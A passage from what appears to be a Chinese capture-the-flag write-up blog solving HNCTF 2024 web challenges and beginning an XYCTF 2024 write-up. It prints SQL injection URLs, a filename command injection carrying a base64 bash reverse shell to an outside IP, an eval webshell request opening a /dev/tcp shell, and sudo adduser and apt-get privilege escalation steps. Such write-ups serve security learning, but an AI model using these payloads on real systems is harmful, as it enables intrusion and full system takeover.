class="keyword">index</span>.php/home/<span class="keyword">index</span>/h_n?<span class="type">name</span>[<span class="number">0</span>]=exp&amp;<span class="type">name</span>[<span class="number">1</span>]==<span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,flag <span class="keyword">from</span> flag</span><br></pre></td></tr></table></figure><p>我这查表名的时候不知道为啥查不出来</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/<span class="keyword">index</span>.php/home/<span class="keyword">index</span>/h_n?<span class="type">name</span>[<span class="number">0</span>]=exp&amp;<span class="type">name</span>[<span class="number">1</span>]==<span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(<span class="built_in">table_name</span>) <span class="keyword">from</span> information_schema.<span class="keyword">tables</span> <span class="keyword">where</span> table_schema=<span class="string">&#x27;think&#x27;</span>     #回显<span class="keyword">false</span></span><br></pre></td></tr></table></figure><h3 id="GoJava（文件名处恶意命令拼接）"><a href="#GoJava（文件名处恶意命令拼接）" class="headerlink" title="GoJava（文件名处恶意命令拼接）"></a>GoJava（文件名处恶意命令拼接）</h3><p>访问<code>robots.txt</code>路由可以看到有个<code>/main-old.zip</code>路由，访问后得到源码，源码中可以看到对文件名进行了过滤</p><p><img src="https://img.picui.cn/free/2024/06/01/665b08f9113a9.png" alt="屏幕截图 2024-05-26 223501.png"></p><p>试试文件名弹shell，文件名改为</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1;<span class="built_in">echo</span> YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMjEuNDAuMTk1LjE5NC8yMzMzIDA+JjEi | <span class="built_in">base64</span> -d | bash;1.java</span><br></pre></td></tr></table></figure><p>弹成功了，确实是文件名处恶意命令拼接，<code>ls /</code>可以看到<code>memorandum</code>也就是备忘录，拿到密码后<code>su root</code>登录<code>root</code>账户在<code>/root/flAg</code>中拿到flag</p><p><img src="https://img.picui.cn/free/2024/06/01/665b090fe0f28.png" alt="image-20240526224835164.png"></p><h3 id="GPTS（CVE-2024-31224、基础渗透）"><a href="#GPTS（CVE-2024-31224、基础渗透）" class="headerlink" title="GPTS（CVE-2024-31224、基础渗透）"></a>GPTS（CVE-2024-31224、基础渗透）</h3><p>进题是个gpt，z3佬说这种一般都是搜的新cve，打个pickle反序列化，我不知道为啥弹不起shell，弹shell登录的是ctfgame用户</p><p>查找由用户 <code>ctfgame</code> 拥有并且对其可读的所有文件</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -<span class="keyword">type</span> f -<span class="keyword">user</span> <span class="title">ctfgame</span> -readable <span class="number">2</span>&gt;/dev/null</span><br></pre></td></tr></table></figure><blockquote><ul><li><code>find</code>: 这是主命令，用于在指定的目录及其子目录中查找文件。</li><li><code>/</code>: 这是find命令的起点，即从根目录开始搜索。根目录是文件系统的最高层级目录。</li><li><code>-type f</code>: 这个选项指定了要查找的对象类型，<code>f</code>表示只查找普通文件，不包括目录、链接等其他类型的文件。</li><li><code>-user ctfgame</code>: 这个选项用来过滤找到的文件，只显示属于用户<code>ctfgame</code>的文件。这意味着文件的所有者是<code>ctfgame</code>。</li><li><code>-readable</code>: 这个选项可能不是所有版本的<code>find</code>命令都支持。它通常意味着只显示可读的文件，即当前用户有权限阅读的文件。不过，这个选项的具体行为可能会根据系统的find实现有所不同。在一些系统中，如果明确需要查找用户可读文件，可能需要通过权限测试来实现，例如<code>-perm /o=r</code>来查找其他人可读的文件。</li><li><code>2&gt;/dev/null</code>: 这部分是重定向操作。<code>2</code>代表标准错误输出，<code>&gt;</code>是重定向符号，<code>/dev/null</code>是一个特殊的文件，任何写入它的数据都会被丢弃。因此，<code>2&gt;/dev/null</code>的意思是将查找过程中可能出现的错误信息（比如权限 denied 的警告）丢弃，不让它们显示在终端上，使得输出更加干净，只关注实际查找到的文件列表</li></ul></blockquote><p>查看&#x2F;var&#x2F;mail&#x2F;ctfgame，读邮件中的敏感信息，如下</p><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">From</span> root,</span><br><span class="line"><span class="keyword">To</span> ctfgame(ctfer),</span><br><span class="line"></span><br><span class="line">You know that I<span class="comment">&#x27;m giving you permissions to make it easier for you to build your website, but now your users have been hacked.</span></span><br><span class="line"></span><br><span class="line">This <span class="built_in">is</span> the last chance, please <span class="keyword">take</span> care <span class="keyword">of</span> your security, I helped you reset your account password.</span><br><span class="line"></span><br><span class="line">ctfer : KbsrZrSCVeui#+R</span><br><span class="line"></span><br><span class="line">I hope you cherish this opportunity.</span><br></pre></td></tr></table></figure><p>用密码<code>KbsrZrSCVeui#+R</code>切换到ctfer账户，没权限看&#x2F;etc&#x2F;sudoers ，用sudo -l</p><blockquote><p>sudo -l：查看当前用户通过sudo命令能执行哪些权限提升的操作</p></blockquote><p>回显内容如下</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Matching</span> <span class="title class_">Defaults</span> entries <span class="keyword">for</span> ctfer on hnctf-01<span class="symbol">hxryr832qjjc3astkt4rw4dw:</span></span><br><span class="line">    env_reset, mail_badpass, secure_path=<span class="regexp">/usr/local</span><span class="regexp">/sbin\:/usr</span><span class="regexp">/local/bin</span>\<span class="symbol">:/usr/sbin</span>\<span class="symbol">:/usr/bin</span>\<span class="symbol">:/sbin</span>\<span class="symbol">:/bin</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">User</span> ctfer may run the following commands on hnctf-01<span class="symbol">hxryr832qjjc3astkt4rw4dw:</span></span><br><span class="line">    (root) <span class="variable constant_">NOPASSWD</span>: <span class="regexp">/usr/sbin</span><span class="regexp">/adduser, !/usr</span><span class="regexp">/sbin/adduser</span> * sudo, !<span class="regexp">/usr/sbin</span><span class="regexp">/adduser * admin</span></span><br></pre></td></tr></table></figure><blockquote><ol><li><strong>Defaults entries for ctfer</strong>: 这部分显示了应用到用户<code>ctfer</code>的默认sudo配置项，这些设置适用于该用户的所有sudo操作。这里列出了三项：<ul><li><code>env_reset</code>: 在执行sudo命令前重置环境变量，提高安全性。</li><li><code>mail_badpass</code>: 如果sudo执行时密码验证失败，发送邮件通知。</li><li><code>secure_path</code>: 设定执行sudo命令时使用的安全路径，确保命令来自系统信任的目录。列出的路径包括<code>/usr/local/sbin</code>, <code>/usr/local/bin</code>, <code>/usr/sbin</code>, <code>/usr/bin</code>, <code>/sbin</code>, 和 <code>/bin</code>。</li></ul></li><li><strong>User ctfer may run the following commands</strong>: 接下来的部分详细列出了<code>ctfer</code>用户被授权可以执行的具体命令，以及这些命令的执行条件：<ul><li><code>(root) NOPASSWD: /usr/sbin/adduser</code>: 用户<code>ctfer</code>可以无密码（NOPASSWD）以root权限执行<code>/usr/sbin/adduser</code>命令，即添加新用户的操作。<code>/usr/sbin/adduser</code> 是一个方便的命令行工具，用于在 Linux 系统中管理用户账户。 </li><li><code>!/usr/sbin/adduser * sudo</code>: 但是，禁止（用”!”表示）<code>ctfer</code>使用<code>adduser</code>命令为任何用户名（星号<code>*</code>代表任意用户名）添加sudo权限。这意味着不能通过<code>adduser</code>命令直接赋予其他用户sudo访问权限。</li><li><code>!/usr/sbin/adduser * admin</code>: 同样，也禁止为任何用户名添加“admin”权限或角色，进一步限制了通过<code>adduser</code>命令赋予高权限的能力。</li></ul></li></ol></blockquote><p>添加一个root组用户</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo adduser test <span class="attribute">-gid</span>=0</span><br></pre></td></tr></table></figure><blockquote><p><code>-gid=0</code>: 指定了新建用户的主要组ID（Group ID，GID）为0。在大多数类UNIX系统中，GID 0对应于root组，这是系统中拥有最高权限的组。通常，只有root用户属于这个组。</p></blockquote><p>以root组用户test登录后查看<code>/etc/sudoers</code>文件</p><blockquote><p><code>/etc/sudoers</code>：sudo授权规则配置文件，它定义了用户或用户组在系统上执行哪些命令时可以获得超级用户（root）的权限，以及这些命令可以在哪些主机上执行，并可以指定是否需要密码。</p></blockquote><p>得到</p><figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># This file MUST be edited with the &#x27;visudo&#x27; command as root.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Please consider adding local content in /etc/sudoers.d/ instead of</span></span><br><span class="line"><span class="comment"># directly modifying this file.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># See the man page for details on how to write a sudoers file.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line">Defaults        env_reset</span><br><span class="line">Defaults        mail_badpass</span><br><span class="line">Defaults        secure_path=<span class="string">&quot;/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Host alias specification</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># User alias specification</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Cmnd alias specification</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># User privilege specification</span></span><br><span class="line">root    <span class="literal">ALL</span>=(<span class="literal">ALL</span>:<span class="literal">ALL</span>) <span class="literal">ALL</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Allow members of group sudo to execute any command</span></span><br><span class="line">%sudo   <span class="literal">ALL</span>=(<span class="literal">ALL</span>:<span class="literal">ALL</span>) <span class="literal">ALL</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># See sudoers(5) for more information on &quot;@include&quot; directives:</span></span><br><span class="line"></span><br><span class="line">@includedir /etc/sudoers.d</span><br><span class="line">ctfer <span class="literal">ALL</span>=(root) NOPASSWD: /usr/sbin/adduser, !/usr/sbin/adduser * sudo, !/usr/sbin/adduser * <span class="literal">admin</span></span><br><span class="line">kobe <span class="literal">ALL</span>=(root) PASSWD: /usr/bin/apt-get</span><br></pre></td></tr></table></figure><p>以上内容中<code>kobe ALL=(root) PASSWD: /usr/bin/apt-get</code>表示用户<code>kobe</code>可以以root身份执行<code>apt-get</code>命令，但需要输入密码。</p><p>kobe可以apt-get提权，现在我们要以kobe身份登录，先切回ctfer，sudo adduser kobe创建一个kobe用户</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">sudo adduser kobe</span></span><br></pre></td></tr></table></figure><p>再以kobe身份登录，apt-get提权，apt-get提权见文章：<a href="https://lzcloudsecurity.gitbook.io/yun-an-quan-gong-fang-ru-men/di-er-zhang-linux-gong-fang-kuai-su-ru-men-shang/sudo-shou-quan-yu-ti-quan">SUDO授权与提权 | 云安全攻防入门</a></p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update -o APT::Update::Pre-Invoke::=<span class="string">&quot;/bin/bash -i&quot;</span></span><br></pre></td></tr></table></figure><p>最后</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /root/f*/f*</span><br></pre></td></tr></table></figure><h3 id="奇怪的网站（302跳转、OPTIONS请求、基础提权）"><a href="#奇怪的网站（302跳转、OPTIONS请求、基础提权）" class="headerlink" title="奇怪的网站（302跳转、OPTIONS请求、基础提权）"></a>奇怪的网站（302跳转、OPTIONS请求、基础提权）</h3><p>进题会发现302跳转直接跳转到<code>/index.png</code>路由，抓个只有网址的包</p><p><img src="https://img.picui.cn/free/2024/06/01/665b093feadca.png" alt="image-20240527173406132.png"></p><p>可以看到配置为<code>Apache/2.4.25 (Debian)</code>，然后php版本为5.6.40，vim那串字符的内容是<code>vim怎么异常退出了啊啊啊啊~</code>我这里bp中文解析不了，说明还存在vim缓存文件泄露</p><p>扫目录发现<code>/flag.php</code>和<code>/404.php</code>，抓404.php的包可以看到响应头中有提示</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Secret: After PUT, does <span class="keyword">the</span> server <span class="built_in">write</span> <span class="keyword">the</span> <span class="built_in">file</span> directly?preflight?</span><br></pre></td></tr></table></figure><p>而且响应头的Cookie的值<code>?ff</code>后面读文件会用，为PUT是一个请求方法，preflight是预检请求，大概意思就是preflight请求使用 OPTIONS方法向服务器询问对于即将发起的跨域请求服务器是否给予权限，浏览器会查看服务器返回的响应头信息来确定是否可以安全地进行 PUT 请求</p><p>flag.php的缓存文件为 .flag.php.swm(4次异常退出导致)，下载下来后发现是乱码，用<code>vim -r flag.php.swm</code>恢复一下得到</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">you find me!</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$num</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="variable">$a</span> = <span class="title function_ invoke__">ord</span>(<span class="string">&#x27;1&#x27;</span>);</span><br><span class="line">        <span class="variable">$b</span> = <span class="title function_ invoke__">ord</span>(<span class="string">&#x27;9&#x27;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$num</span>); <span class="variable">$i</span>++)</span><br><span class="line">        &#123;</span><br><span class="line">                <span class="variable">$c</span> = <span class="title function_ invoke__">ord</span>(<span class="variable">$num</span>&#123;<span class="variable">$i</span>&#125;);</span><br><span class="line">                <span class="keyword">if</span> ( (<span class="variable">$c</span> &gt;= <span class="variable">$a</span>) &amp;&amp; (<span class="variable">$c</span> &lt;= <span class="variable">$b</span>) )</span><br><span class="line">                &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">           <span class="keyword">return</span> <span class="variable">$num</span> == <span class="string">&#x27;11259375&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br></pre></td></tr></table></figure><p>以上代码就是要求num的值不包含数字1到9且最后结果为11259375，十六进制0xabcdef绕即可，得到</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">hint:</span> 没有扫到那个文件吗?!或者去首页看看?</span><br></pre></td></tr></table></figure><p>首页是<code>/index.png</code>路由，又结合网站是个php网站，猜测有可能是在⼀个 php ⽂件⾥预先包含了 index.png， 那么就⼀定 有 .htaccess 的配置⽂件 ， 以及之前扫目录扫出很多 htaccess 的相关⽂件，先发一个OPTIONS请求的包看下能用哪些请求方式</p><p><img src="https://img.picui.cn/free/2024/06/01/665b093fdb670.png" alt="image-20240527203330141.png"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">OPTIONS</span> /<span class="number">404</span>.php?ff=.htaccess HTTP/<span class="number">1</span>.<span class="number">1</span></span><br></pre></td></tr></table></figure><p>发包读<code>.htaccess</code>文件得到</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">order</span> <span class="literal">deny</span>,<span class="literal">allow</span></span><br><span class="line"><span class="attribute">RewriteEngine</span> <span class="literal">On</span></span><br><span class="line"><span class="attribute">RewriteBase</span> /</span><br><span class="line"><span class="attribute">RewriteRule</span> ^(.*gggoku).php$ ggggoku.php<span class="meta"> [NC]</span></span><br></pre></td></tr></table></figure><blockquote><ol><li><code>Order deny,allow</code>: 这一行是Apache旧的访问控制语法，用于确定访问权限的处理顺序。<code>deny</code>先行，意味着先执行拒绝访问的规则，然后才是允许访问的规则。不过，这个指令在Apache 2.4及以上版本中已被弃用，现在推荐使用<code>Require</code>指令来控制访问权限。</li><li><code>RewriteEngine On</code>: 这行启用了Apache的重写引擎，使得后续的重写规则能够生效。重写引擎是实现URL美化、路由等功能的关键组件。</li><li><code>RewriteBase /</code>: 设定重写规则的基准目录为网站根目录。这意味着在重写规则中的相对路径都将从网站根目录开始计算。</li><li><code>RewriteRule ^(.*gggoku)\.php$ ggggoku.php [NC]</code>: 这是一条具体的重写规则，其意义是，对于所有以”.php”结尾，且URL路径中包含”gggoku”字符串的请求，都将被重定向到”ggggoku.php”。这里的<code>^(.*gggoku)\.php$</code>是一个正则表达式，匹配以任何字符序列开始，接着是”gggoku”，然后是”.php”结束的字符串。方括号内的<code>[NC]</code>表示不区分大小写(NC stands for No Case)，即在进行匹配时不区分字母的大小写。</li></ol></blockquote><p>继续读<code>ggggoku.php</code>得到</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/`/i&#x27;</span>, <span class="variable">$a</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;nonono~~~&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;$b=&quot;&#x27;</span> . <span class="title function_ invoke__">addslashes</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]) . <span class="string">&#x27;&quot;;&#x27;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;RCE都不会了?&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>以上绕过见文章:<a href="https://blog.csdn.net/silence1_/article/details/102853517,%E9%80%9A%E8%BF%87%E6%9F%A5%E7%9C%8Bphpinfo%E5%8F%91%E7%8E%B0%E7%A6%81%E7%94%A8%E4%BA%86%E5%BE%88%E5%A4%9A%E5%87%BD%E6%95%B0%EF%BC%8C%E4%BD%86%E5%8F%91%E7%8E%B0popen%E5%87%BD%E6%95%B0%E5%8F%AF%E4%BB%A5%E4%BD%BF%E7%94%A8%EF%BC%8Cfget%E4%B9%9F%E8%A2%AB%E8%BF%87%E6%BB%A4%E4%BA%86%E7%94%A8fgetss%E8%AF%BB%EF%BC%8C">https://blog.csdn.net/silence1_/article/details/102853517,通过查看phpinfo发现禁用了很多函数，但发现popen函数可以使用，fget也被过滤了用fgetss读，</a></p><p>反弹shell</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">GET</span>: /ggggoku.php?a=<span class="variable">$&#123;eval($_POST[0])&#125;</span></span><br><span class="line"><span class="attribute">POST</span>: <span class="number">0</span>=%<span class="number">24</span>fd%<span class="number">3</span>Dpopen%<span class="number">28</span>%<span class="number">22</span>bash+-c++%<span class="number">27</span>bash+i+%<span class="number">3</span>E%<span class="number">26</span>+%<span class="number">2</span>Fdev%<span class="number">2</span>Ftcp%<span class="number">2</span>Fip%<span class="number">2</span>Fport+<span class="number">0</span>%<span class="number">3</span>E%<span class="number">261</span>%<span class="number">27</span>%<span class="number">22</span>%<span class="number">2</span>C%<span class="number">27</span>r%<span class="number">27</span>%<span class="number">29</span>%<span class="number">3</span>B++%<span class="number">0</span>Awhile%<span class="number">28</span>%<span class="number">24</span>s%<span class="number">3</span>Dfgetss%<span class="number">28</span>%<span class="number">24</span>fd%<span class="number">29</span>%<span class="number">29</span>%<span class="number">7</span>B++%<span class="number">0</span>Aprint_r%<span class="number">28</span>%<span class="number">24</span>s%<span class="number">29</span>%<span class="number">3</span>B++%<span class="number">0</span>A%<span class="number">7</span>D</span><br></pre></td></tr></table></figure><p>🌿了这个也弹不起，最后就是提权读flag</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">find</span> / -perm <span class="attribute">-u</span>=s -type f 2&gt;/dev/<span class="literal">null</span></span><br></pre></td></tr></table></figure><blockquote><ul><li><code>find</code>：是Linux系统中用于查找和遍历文件层次结构的命令。</li><li><code>/</code>：是查找的起点，这里表示从根目录开始在整个文件系统中搜索。</li><li><code>-perm -u=s</code>：这是一个权限相关的选项，用于匹配具有特定权限的文件。<code>-u=s</code>意味着只查找那些用户权限位中设置了setuid位的文件。setuid权限允许任何用户以文件所有者的权限来运行该程序，这在需要提升权限执行某些操作的场景下很有用，但也可能带来安全风险。</li><li><code>-type f</code>：这个选项指定了要查找的对象类型，<code>f</code>代表普通文件，意味着只查找文件，不包括目录、链接等其他类型的文件。</li><li><code>2&gt;/dev/null</code>：这部分是重定向操作，<code>2&gt;</code>表示将标准错误（stderr，错误输出）重定向，<code>/dev/null</code>是一个特殊的文件，任何写入它的数据都会被丢弃。所以，此命令在执行过程中遇到的任何权限不足或无法访问目录的错误信息都不会显示出来，使输出更加干净，只关注找到的文件结果。</li></ul></blockquote><p>得到</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/chfn</span><br><span class="line"><span class="regexp">/usr/bin</span><span class="regexp">/passwd</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/bin/newgrp</span></span><br><span class="line"><span class="regexp">/usr/bin</span><span class="regexp">/gpasswd</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/bin/chsh</span></span><br><span class="line"><span class="regexp">/bin/umount</span></span><br><span class="line"><span class="regexp">/bin/mount</span></span><br><span class="line"><span class="regexp">/bin/su</span></span><br></pre></td></tr></table></figure><p>用su命令，root密码在&#x2F;home&#x2F;admin&#x2F;passwd文件中, 借下lzy的图了</p><p><img src="https://img.picui.cn/free/2024/06/01/665b093feff3f.png" alt="image-20240527215129673.png"></p><p>参考：</p><p><a href="https://lisien11.github.io/2024/05/13/hnctf-wp/">https://lisien11.github.io/2024/05/13/hnctf-wp/</a></p><p><a href="https://z3r4y.blog.csdn.net/article/details/138844248?spm=1001.2014.3001.5502">https://z3r4y.blog.csdn.net/article/details/138844248?spm=1001.2014.3001.5502</a></p><p><a href="https://docs.qq.com/doc/p/641e8742c39d16cd6d046b18bcb251fd3ab0cd6d?ADUIN=2869873959&ADSESSION=1716725232&ADTAG=CLIENT.QQ.6061_.0&ADPUBNO=27411&jumpuin=2869873959">https://docs.qq.com/doc/p/641e8742c39d16cd6d046b18bcb251fd3ab0cd6d?ADUIN=2869873959&amp;ADSESSION=1716725232&amp;ADTAG=CLIENT.QQ.6061_.0&amp;ADPUBNO=27411&amp;jumpuin=2869873959</a></p>]]></content>
      
      
      <categories>
          
          <category> CTFwp及复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTFwp及复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XYCTF2024 web wp(17/18)</title>
      <link href="/2024/04/28/XYCTF2024-web-wp-17-18/"/>
      <url>/2024/04/28/XYCTF2024-web-wp-17-18/</url>
      
        <content type="html"><![CDATA[<h1 id="XYCTF2024-web-wp-17-18"><a href="#XYCTF2024-web-wp-17-18" class="headerlink" title="XYCTF2024 web wp(17&#x2F;18)"></a>XYCTF2024 web wp(17&#x2F;18)</h1><p>前言：这次比赛打了1个月，学到了很多。本wp一大半是实验室里的佬解出来的，这份wp，呃，大概起到一个复现的作用</p><h3 id="ezhttp（http协议）"><a href="#ezhttp（http协议）" class="headerlink" title="ezhttp（http协议）"></a>ezhttp（http协议）</h3><p>开题是个登录框，看下源码有啥</p><p><img src="https://img2.imgtp.com/2024/04/29/YAWxDwNk.png" alt="image-20240402204312236.png"></p><p>主办方说了不能用扫描器，盲猜一手<code>/robots.txt</code></p><p><img src="https://img2.imgtp.com/2024/04/29/iwfJetsl.png" alt="image-20240402204422706.png"></p><p>访问<code>/l0g1n.txt</code></p><p><img src="https://img2.imgtp.com/2024/04/29/MAnX9v6d.png" alt="image-20240402204501210.png"></p><p>登录后就是打常规的http协议了，payload</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">User-Agent: XYCTF </span></span><br><span class="line"><span class="section">Client-ip:127.0.0.1</span></span><br><span class="line"><span class="section">via:ymzx.qq.com</span></span><br><span class="line"><span class="section">Referer: yuanshen.com</span></span><br><span class="line"><span class="section">Cookie: XYCTF</span></span><br></pre></td></tr></table></figure><h3 id="牢牢记住，逝者为大（nc反弹shell、绕过字符串拼接rce）"><a href="#牢牢记住，逝者为大（nc反弹shell、绕过字符串拼接rce）" class="headerlink" title="牢牢记住，逝者为大（nc反弹shell、绕过字符串拼接rce）"></a>牢牢记住，逝者为大（nc反弹shell、绕过字符串拼接rce）</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Kobe</span>(<span class="params"><span class="variable">$cmd</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$cmd</span>) &gt; <span class="number">13</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;see you again~&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/echo|exec|eval|system|fputs|\.|\/|\\|/i&quot;</span>, <span class="variable">$cmd</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;肘死你&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$val_name</span> =&gt; <span class="variable">$val_val</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/bin|mv|cp|ls|\||f|a|l|\?|\*|\&gt;/i&quot;</span>, <span class="variable">$val_val</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;what can i say&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$cmd</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$cmd</span> = <span class="title function_ invoke__">Kobe</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span 